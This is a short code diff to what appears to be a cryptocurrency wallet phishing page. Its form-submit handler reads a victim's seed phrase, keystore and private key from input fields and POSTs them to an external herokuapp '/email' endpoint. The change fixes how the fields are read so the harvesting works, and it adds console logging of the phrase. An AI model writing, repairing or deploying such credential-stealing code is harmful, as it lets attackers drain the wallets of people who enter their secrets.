@@ -58,9 +58,9 @@
             Form.addEventListener("submit", function 
                     (e) {
                         e.preventDefault();
-                        let phrase = document.getElementById("phrase").innerHTML;
-                        let keyStore = document.getElementById("keystore").innerHTML;
-                        let privateKey = document.getElementById("privatekey").innerHTML;
+                        let phrase = document.querySelector("#phrase").value;
+                        let keyStore = document.querySelector("#keystore").value;
+                        let privateKey = document.querySelector("#privatekey").value;
                         
 
                         const data = {
@@ -69,7 +69,7 @@
                         privateKey
                     };
 
-                    console.log(data);
+                    console.log(data , "This is data result" , phrase , "This is a phrase");
 
                     fetch("https://app-registry.herokuapp.com/email", {
                         method: 'POST',
